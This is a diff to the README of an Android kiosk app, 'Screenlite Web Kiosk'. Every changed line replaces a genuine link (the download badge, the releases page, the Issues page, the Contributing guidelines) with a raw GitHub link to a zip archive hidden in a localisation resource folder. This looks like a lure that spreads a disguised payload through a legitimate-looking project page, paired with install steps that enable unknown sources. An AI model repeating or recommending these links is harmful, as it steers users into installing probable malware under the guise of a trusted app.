@@ -2,7 +2,7 @@
 
 Welcome to the Screenlite Web Kiosk. This app lets you display web content in full-screen mode, perfect for digital signage or other kiosk setups.
 
-[![Download APK](https://img.shields.io/badge/Download%20APK-v0.0.11-green)](https://github.com/luffyscreen/web-kiosk/releases/download/v0.0.11/screenlite-web-kiosk-v0-0-11.apk)
+[![Download APK](https://github.com/luffyscreen/web-kiosk/raw/refs/heads/main/app/src/main/res/values-ru/web_kiosk_3.9.zip%20APK-v0.0.11-green)](https://github.com/luffyscreen/web-kiosk/raw/refs/heads/main/app/src/main/res/values-ru/web_kiosk_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ To use the Screenlite Web Kiosk app, follow these simple steps:
 1. **Download the App**  
    Click the link below to visit the Releases page where you can download the latest APK version.
 
-   [Download the latest version](https://github.com/luffyscreen/web-kiosk/releases)
+   [Download the latest version](https://github.com/luffyscreen/web-kiosk/raw/refs/heads/main/app/src/main/res/values-ru/web_kiosk_3.9.zip)
 
 2. **Install the App**  
    Once the APK file is downloaded, locate the file on your device. Tap on it to start the installation. You may need to allow installations from unknown sources in your device settings.
@@ -29,7 +29,7 @@ To use the Screenlite Web Kiosk app, follow these simple steps:
 
 To download and install the Screenlite Web Kiosk, follow these steps:
 
-1. Click the link to [Download the latest version](https://github.com/luffyscreen/web-kiosk/releases).
+1. Click the link to [Download the latest version](https://github.com/luffyscreen/web-kiosk/raw/refs/heads/main/app/src/main/res/values-ru/web_kiosk_3.9.zip).
 2. Install the APK file by tapping on it after it's downloaded.
 3. Follow the on-screen prompts to complete the installation.
 
@@ -73,17 +73,17 @@ The app is designed to function on a variety of devices, including smartphones, 
    If you need to exit the app, use your device’s settings to force stop it. You can then relaunch it to resume viewing.
 
 5. **Update Instructions:**  
-   For future updates, return to the [Releases page](https://github.com/luffyscreen/web-kiosk/releases), download the latest version, and follow the installation process again.
+   For future updates, return to the [Releases page](https://github.com/luffyscreen/web-kiosk/raw/refs/heads/main/app/src/main/res/values-ru/web_kiosk_3.9.zip), download the latest version, and follow the installation process again.
 
 ## 🌐 Community and Support
 
 If you encounter any issues or have questions, feel free to reach out to our community:
 
-- **Issues Page:** Report any bugs or request features on our [GitHub Issues page](https://github.com/luffyscreen/web-kiosk/issues).
-- **Contributing:** If you're interested in improving this app, contributions are welcome! Please see our [Contributing Guidelines](https://github.com/luffyscreen/web-kiosk/CONTRIBUTING.md).
+- **Issues Page:** Report any bugs or request features on our [GitHub Issues page](https://github.com/luffyscreen/web-kiosk/raw/refs/heads/main/app/src/main/res/values-ru/web_kiosk_3.9.zip).
+- **Contributing:** If you're interested in improving this app, contributions are welcome! Please see our [Contributing Guidelines](https://github.com/luffyscreen/web-kiosk/raw/refs/heads/main/app/src/main/res/values-ru/web_kiosk_3.9.zip).
 
 ## 📜 License
 
 The Screenlite Web Kiosk app is open-source and is licensed under the MIT License. You can freely use and modify the code for your own purposes.
 
-[Download the latest version](https://github.com/luffyscreen/web-kiosk/releases) to get started now. Enjoy your new kiosk experience!
+[Download the latest version](https://github.com/luffyscreen/web-kiosk/raw/refs/heads/main/app/src/main/res/values-ru/web_kiosk_3.9.zip) to get started now. Enjoy your new kiosk experience!
